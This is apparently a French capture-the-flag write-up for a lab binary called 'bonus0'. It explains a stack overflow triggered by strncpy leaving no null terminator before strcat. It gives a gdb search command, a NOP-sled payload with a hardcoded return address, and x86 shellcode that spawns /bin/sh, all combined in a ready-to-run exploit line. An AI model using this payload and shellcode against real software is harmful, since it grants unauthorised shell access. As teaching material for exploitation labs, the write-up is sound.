# Bonus0 - Buffer Overflow avec Concaténation

## Fonctionnement du Programme

**Fonction p()**
- Lit jusqu'à 4096 bytes dans un buffer
- Utilise strncpy pour copier 20 bytes dans le buffer destination
- Ne garantit pas de null byte à la fin de la copie

**Fonction pp()**
- Déclare deux buffers locaux : buffer1 et buffer2
- Appelle p() deux fois pour remplir ces buffers
- Concatène les buffers avec un espace entre eux

## Vulnérabilités

1. **strncpy sans null byte**
- La fonction p() copie exactement 20 bytes sans ajouter de null byte

2. **Concaténation dangereuse**
- strcat est utilisés sans vérification de taille 
- buffer2 etant la source et n'ayant pas de null-terminate byte strcat read au dela du buffer

## Processus d'Exploitation

1. **Premier Buffer**
- Rempli avec 20 NOPs
- Sans null byte terminal

2. **Second Buffer**
- 9 NOPs pour atteindre l'adresse de retour / saved eip du main
- Adresse pointant vers notre shellcode
- NOPs supplémentaires + shellcode

3. **Concaténation**
- Les deux buffers sont concaténés avec un espace
- L'overflow écrase l'adresse de retour
- Le flux d'exécution est redirigé vers notre shellcode

4. **Exécution du Shellcode**
- Les NOPs permettent une zone d'atterrissage flexible
- Le shellcode exécute /bin/sh

## Exploitation

- Trouver l'adresse du shellcode dans la stack avec la commande find de gdb
```nasm
find /b 0xbfffe590, +2000, 0x6a, 0x0b, 0x58, 0x99, 0x52, 0x68, 0x2f, 0x2f, 0x73, 0x68, 0x68, 0x2f, 0x62, 0x69, 0x6e, 0x89, 0xe3, 0x31, 0xc9, 0xcd, 0x80
```

**Construction du Payload**
```python
# Premier input : 20 NOPs
"\x90" * 20

# Deuxième input : NOPs + Adresse + Shellcode
"\x90" * 9 + "\xbb\xe5\xff\xbf" + "\x90" * 30 + \
"\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
```

**Exécution**
```bash
(python -c 'print "\x90"*20' ; python -c 'print "\x90"*9 + "\xbb\xe5\xff\xbf" + "\x90" * 30 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"'; cat) | ./bonus0
```
